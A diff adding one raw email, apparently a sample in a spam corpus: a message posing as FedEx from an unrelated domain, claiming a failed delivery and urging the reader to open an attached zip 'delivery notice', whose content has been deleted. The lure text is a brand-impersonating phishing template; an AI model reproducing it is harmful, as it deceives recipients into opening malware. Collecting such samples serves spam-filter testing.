@@ -1,0 +1,52 @@
+Delivered-To: rait@bruce-guenter.dyndns.org
+Received: (qmail 17488 invoked from network); 1 May 2017 11:54:31 -0000
+Received: from localhost (localhost [127.0.0.1])
+  by bruce-guenter.dyndns.org ([192.168.1.2]); 01 May 2017 11:54:31 -0000
+Received: from zak.futurequest.net ([127.0.0.1])
+  by localhost ([127.0.0.1])
+  with SMTP via TCP; 01 May 2017 11:54:31 -0000
+Received: (qmail 9018 invoked from network); 1 May 2017 11:54:29 -0000
+Received: from unknown (HELO bekelektrik.com) (115.238.68.121)
+  by zak.futurequest.net with SMTP; 1 May 2017 11:54:29 -0000
+Message-ID: <2C9CC08B.824A101B@bekelektrik.com>
+Date: Mon, 01 May 2017 11:54:22 -0700
+Reply-To: "FedEx International Delivery" <ecogeuls21546460@bekelektrik.com>
+From: "FedEx Express Delivery" <ecogeuls21546460@bekelektrik.com>
+User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.1.9) Gecko/20100317 Thunderbird/3.0.4
+X-Accept-Language: en-us
+MIME-Version: 1.0
+To: <rait@bruce-guenter.dyndns.org>
+Subject: We're sad to let you know that our delivery was unusuccessful... FedEx Parcel #36358271
+Content-Type: multipart/mixed;
+	boundary="------------234684078134651336685433"
+
+This is a multi-part message in MIME format.
+
+--------------234684078134651336685433
+Content-Type: text/plain;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: 7bit
+
+Hello,
+
+This e-mail is the confirmation of our 1st delivery try. Actual Status:
+Failure.
+
+Urgent more details is in the delivery notice enclosed.
+
+Thanks.
+Eleni Lopes -  FedEx Logistics Serivces
+
+
+--------------234684078134651336685433
+Content-Type: message/external-body; access-type=x-deleted; length=1597
+
+
+Content-Type: application/octet-stream;
+	name="DeliveryDetails_id_165870.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment;
+	filename="DeliveryDetails_id_0453274.zip"
+
+--------------234684078134651336685433--
+
